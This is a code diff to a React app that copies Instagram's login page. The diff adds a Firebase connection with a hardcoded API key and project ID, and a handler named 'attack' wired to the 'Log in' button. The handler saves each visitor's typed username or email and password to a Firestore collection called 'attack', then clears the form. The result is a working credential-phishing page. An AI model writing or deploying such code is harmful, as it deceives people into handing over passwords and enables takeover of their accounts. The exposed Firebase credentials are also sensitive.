@@ -1,12 +1,47 @@
 import "./App.css";
+import { useState } from "react";
 import instaMobileApp from "./images/instamobile.png";
-import logo from "./images/instaLogo.png";
 import loginFB from "./images/loginFB.png";
 import play from "./images/play.png";
 import microsoft from "./images/microsoft.png";
 import foot from "./images/foot.png";
+import { initializeApp } from "firebase/app";
+import { collection, addDoc } from "firebase/firestore";
+import { getFirestore } from "firebase/firestore";
 
 function App() {
+  const [email, setEmail] = useState();
+  const [password, setPassword] = useState();
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDZY1bEEg9NWDfaJXs-fSRlL6cpHMFurfU",
+    authDomain: "instagram-login-cd0fc.firebaseapp.com",
+    projectId: "instagram-login-cd0fc",
+    storageBucket: "instagram-login-cd0fc.appspot.com",
+    messagingSenderId: "669619895003",
+    appId: "1:669619895003:web:346a9e3e321fcdc38beafe",
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  const attack = async (e) => {
+    e.preventDefault();
+
+    try {
+      const docRef = await addDoc(collection(db, "attack"), {
+        email: email,
+        password: password,
+      });
+      // console.log("Document written with ID: ", docRef.id);
+      setEmail("");
+      setPassword("");
+    } catch (e) {
+      console.error("Error adding document: ", e);
+    }
+  };
+
   return (
     <div className="App">
       <div className="container">
@@ -25,19 +60,20 @@ function App() {
                     <input
                       type="text"
                       placeholder="Phone number, username, or email"
+                      value={email}
+                      onChange={(e) => setEmail(e.target.value)}
                     />
-                    <label for="username" className="label_usname">
-                      Phone number, username, or email
-                    </label>
                   </div>
                   <div className="form_input">
-                    <input type="password" placeholder="password" />
-                    <label for="password" className="label_pswr">
-                      Password
-                    </label>
+                    <input
+                      type="password"
+                      placeholder="password"
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                    />
                   </div>
                 </div>
-                <button>Log in</button>
+                <button onClick={attack}>Log in</button>
               </div>
               <div class="separator">
                 <div class="line"></div>
